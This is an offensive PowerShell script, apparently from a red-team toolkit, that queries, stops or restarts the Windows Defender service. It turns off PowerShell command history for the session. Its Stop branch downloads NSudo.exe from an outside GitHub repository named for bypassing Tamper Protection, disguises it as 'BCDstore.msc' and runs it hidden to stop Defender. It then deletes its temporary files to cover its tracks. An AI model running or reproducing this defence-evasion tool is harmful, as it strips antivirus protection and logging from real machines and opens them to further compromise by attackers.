<#
.SYNOPSIS
   Disable Windows Defender Service (WinDefend) 

   Author: @M2Team|@r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: admin privileges
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   This CmdLet Query, Stops, Start Anti-Virus Windows Defender
   service without the need to restart or refresh target machine.

.NOTES
   Mandatory requirements: $ Administrator privileges $
   Remark: Windows warns users that WinDefend is stopped!

.Parameter Action
   Accepts arguments: Query, Stop and Start

.Parameter Delay
   Give some time (sec) to update the service state  

.Parameter ServiceName
   Accepts the Windows Defender Service Name

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Query
   Querys the Windows Defender Service State

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Start
   Starts the Windows Defender Service (WinDefend)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Stop
   Stops the Windows Defender Service (WinDefend)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Stop -ServiceName "WinDefend"
   Manual Input of Windows Defender Service Name (query: cmd /c sc query)

.EXAMPLE
   PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 3
   Give some time (sec) to update the service state (default: 3)

.INPUTS
   None. You cannot pipe objects into DisableDefender.ps1

.OUTPUTS
   Disable Windows Defender Service
   --------------------------------
   ServiceName      : WinDefend
   StartType        : Automatic
   CurrentStatus    : Stopped
   ManualQuery      : Get-Service -Name WinDefend
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$ServiceName="WinDefend",
   [string]$Action="Query",
   [int]$Delay='3' ## Delay time (sec) for service update
)


Write-Host ""
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption -HistorySaveStyle SaveNothing|Out-Null
## Local variable declarations { Cmdlet Internal Settings }
$Working_Directory = pwd|Select-Object -ExpandProperty Path
If($Delay -lt 2 -or $Delay -gt 6){[int]$Delay='2'} ## min\max delay value accepted
$IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")


If($Action -ieq "Query"){## Query Windows Defender state

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Query Windows Defender Service State

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Query

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Query -ServiceName WinDefend

   .OUTPUTS
      Disable Windows Defender Service
      --------------------------------
      ServiceName      : WinDefend
      StartType        : Automatic
      CanStop          : True
      CurrentStatus    : Running
      Exploitable?     : yes : running under admin privs!
      ManualQuery      : Get-Service -Name WinDefend
   #>

   ## Local function variable declarations
   $stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
   $CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status
   $StopType = (Get-Service $ServiceName -EA SilentlyContinue).CanStop
   If($IsClientAdmin -ieq "True"){## Query for exploitation state

       $Exploitable = "yes : running under admin privs!"

   }Else{## not exploitable under shell current privileges!

       $Exploitable = "no : admin privs required!"

   }

   ## Build Output Table
   Write-Host "`nDisable Windows Defender Service" -ForegroundColor Green
   Write-Host "--------------------------------";Start-Sleep -Seconds 1
   echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
   echo "StartType        : $stype" >> $Env:TMP\qwerty.log
   echo "CanStop          : $StopType" >> $Env:TMP\qwerty.log
   echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
   echo "Exploitable?     : $Exploitable" >> $Env:TMP\qwerty.log
   echo "ManualQuery      : Get-Service -Name $ServiceName" >> $Env:TMP\qwerty.log
   echo "" >> $Env:TMP\qwerty.log
   Get-Content -Path "$Env:TMP\qwerty.log"

   ## Clean artifacts left behind and exit script
   Remove-Item -Path "$Env:TMP\qwerty.log" -Force
   Write-Host "";exit ## Exit @DisableDefender


}ElseIf($Action -ieq "Stop"){

   <#
   .SYNOPSIS
      Author: @M2Team|@r00t-3xp10it
      Helper - Stops Windows Defender Service

   .NOTES
      Administrator privileges required on shell

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Stop

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Stop -Delay 2

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Stop -ServiceName WinDefend
   #>

   If($IsClientAdmin -ieq "True"){## Shell running under Admin privileges

      ## Download standalone binary from @swagkarna github repository
      # And Masquerade standalone executable to look like one .msc archive
      powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe','$Env:TMP\BCDstore.msc') }"
      If(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue){

         cd $Env:TMP;.\BCDstore.msc -U:T -ShowWindowMode:Hide sc stop $ServiceName
         cd $Working_Directory ## Return to @redpill working directory

      }Else{## [error] failed to download Nsudo.exe {Masquerade of: BCDstore.msc}

         Write-Host "`n[error] Failed to download: $Env:TMP\BCDstore.msc" -ForegroundColor Red -BackgroundColor Black
         Write-Host "";exit ## Exit @DisableDefender

      }
       
   }Else{## [error] Shell running under 'UserLand' Privileges
       
      Write-Host "`n[error] Administrator privileges required on shell!" -ForegroundColor Red -BackgroundColor Black
      Write-Host "`n";exit ## Exit @DisableDefender

   }


}ElseIf($Action -ieq "Start"){

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Starts Windows Defender Service

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Start

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Start -Delay 2

   .EXAMPLE
      PS C:\> .\DisableDefender.ps1 -Action Start -ServiceName WinDefend
   #>

   ## None Admin privs required to start service
   Start-Service -Name "$ServiceName" -EA SilentlyContinue
}


## Local function variable declarations
Start-Sleep -Seconds $Delay ## Give some time to update service state
$stype = (Get-Service $ServiceName -EA SilentlyContinue).StartType
$CurrStats = (Get-Service $ServiceName -EA SilentlyContinue).Status

## Build Output Table
Write-Host "`nDisable Windows Defender Service" -ForegroundColor Green
Write-Host "--------------------------------"
echo "ServiceName      : $ServiceName" > $Env:TMP\qwerty.log
echo "StartType        : $stype" >> $Env:TMP\qwerty.log
echo "CurrentStatus    : $CurrStats" >> $Env:TMP\qwerty.log
echo "ManualQuery      : Get-Service -Name $ServiceName" >> $Env:TMP\qwerty.log
echo "" >> $Env:TMP\qwerty.log
Get-Content -Path "$Env:TMP\qwerty.log"
Remove-Item -Path "$Env:TMP\qwerty.log" -Force


## Clean Artifacts left behind
If(Test-Path -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue){
    Remove-Item -Path "$Env:TMP\BCDstore.msc" -EA SilentlyContinue  -Force
}